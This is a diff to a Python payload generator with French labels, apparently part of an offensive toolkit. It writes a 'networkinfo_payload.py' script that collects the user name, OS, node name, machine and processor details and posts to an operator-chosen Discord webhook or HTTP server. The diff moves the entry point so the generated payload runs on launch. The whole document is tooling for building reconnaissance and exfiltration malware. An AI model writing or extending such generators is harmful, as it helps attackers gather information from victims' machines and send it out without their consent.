@@ -36,6 +36,7 @@ def networkinfo():
             choix["Envoi par Discord"] = discord
         else:
             choix["Envoi par Discord"] = None
+        banner()
 
     def http_option():
         clear()
@@ -44,6 +45,7 @@ def networkinfo():
             choix["Envoi par serveur HTTP"] = http
         else:
             choix["Envoi par serveur HTTP"] = None
+        banner()
 
     option = [
 
@@ -76,7 +78,7 @@ def collect_network_info():
     network_info = {{
         "Utilisateur": user,
         "Système": system,
-        "Nom du nœud": node,
+        "Nom du noeud": node,
         "Version": version,
         "Machine": machine,
         "Processeur": processor,
@@ -86,8 +88,6 @@ def collect_network_info():
     for key, value in network_info.items():
         print(f"{{key}}: {{value}}")
 
-if __name__ == "__main__":
-    collect_network_info()
 """
     if choix["Envoi par Discord"]:
         payload += f'''
@@ -95,6 +95,9 @@ if __name__ == "__main__":
     discord_webhook = r"{choix['Envoi par Discord']}"
     data = {{"content": "Informations réseau collectées."}}
     requests.post(discord_webhook, data=data)
+
+if __name__ == "__main__":
+    collect_network_info()
         '''
 
     if choix["Envoi par serveur HTTP"]:
@@ -103,7 +106,12 @@ if __name__ == "__main__":
     http_server = r"{choix['Envoi par serveur HTTP']}"
     data = {{"content": "Informations réseau collectées."}}
     requests.post(http_server, data=data)
+
+if __name__ == "__main__":
+    collect_network_info()
         '''
+
+   
 
         payload_path = os.path.join("Option", "modules", "payload", "payload_created", "networkinfo_payload.py")
         os.makedirs(os.path.dirname(os.path.abspath(payload_path)), exist_ok=True)
